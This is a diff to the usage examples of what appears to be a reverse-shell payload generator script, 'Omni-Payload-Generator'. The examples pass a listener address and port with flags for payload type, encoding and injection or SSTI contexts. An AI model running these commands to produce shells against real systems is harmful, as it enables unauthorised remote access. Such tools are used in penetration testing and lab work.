@@ -11,9 +11,12 @@ python3 Omni-Payload-Generator.py $PAYLOAD_TYPE $LHOST $LPORT $OPTIONS
 
 python3 Omni-Payload-Generator.py -ps 10.10.14.20 443
 
-python3 Omni-Payload-Generator.py -ps 10.10.14.20 443 -e
+python3 Omni-Payload-Generator.py -b 10.10.14.20 443 -e
 
-python3 Omni-Payload-Generator.py -ps 10.10.14.20 443 -ifs injection
+python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection
+
+python3 Omni-Payload-Generator.py -y 10.10.14.20 443 -ifs ssti -e
+
 
 
 
